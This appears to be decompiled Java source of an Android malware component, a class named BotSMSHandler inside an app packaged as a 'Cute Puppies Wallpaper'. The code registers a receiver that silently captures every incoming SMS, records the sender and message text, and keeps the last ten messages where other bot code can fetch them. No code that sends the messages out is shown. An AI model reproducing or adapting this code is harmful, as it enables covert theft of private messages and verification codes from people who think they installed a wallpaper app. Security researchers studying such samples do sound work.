// 
// Decompiled by Procyon v0.5.30
// 

package com.adam.CutePuppiesWallpaper;

import android.telephony.SmsMessage;
import android.util.Log;
import android.content.Intent;
import android.content.Context;
import java.util.ArrayList;
import java.util.List;
import android.content.BroadcastReceiver;

public class BotSMSHandler extends BroadcastReceiver
{
    public static final String LOG_TAG = "MCS_BOT_BotSMSHandler";
    private static final int MAX_SMS = 10;
    private static int SMSCounter;
    private static List<String> lSmsMessages;
    
    public static List<String> GetMessages() {
        return BotSMSHandler.lSmsMessages;
    }
    
    public static void Initialize() {
        BotSMSHandler.lSmsMessages = new ArrayList<String>();
        BotSMSHandler.SMSCounter = 0;
    }
    
    public void onReceive(final Context context, final Intent intent) {
        final Object[] array = (Object[])intent.getExtras().get("pdus");
        Log.v("MCS_BOT_BotSMSHandler", "SMS Received\n");
        final SmsMessage[] array2 = new SmsMessage[array.length];
        for (int i = 0; i < array.length; ++i) {
            array2[i] = SmsMessage.createFromPdu((byte[])array[i]);
        }
        final StringBuilder sb = new StringBuilder();
        for (int length = array2.length, j = 0; j < length; ++j) {
            final SmsMessage smsMessage = array2[j];
            sb.append("Received SMS\nFrom: ");
            sb.append(smsMessage.getDisplayOriginatingAddress());
            sb.append("\n");
            sb.append(smsMessage.getDisplayMessageBody());
        }
        BotSMSHandler.lSmsMessages.add(BotSMSHandler.SMSCounter % 10, sb.toString());
        ++BotSMSHandler.SMSCounter;
    }
}
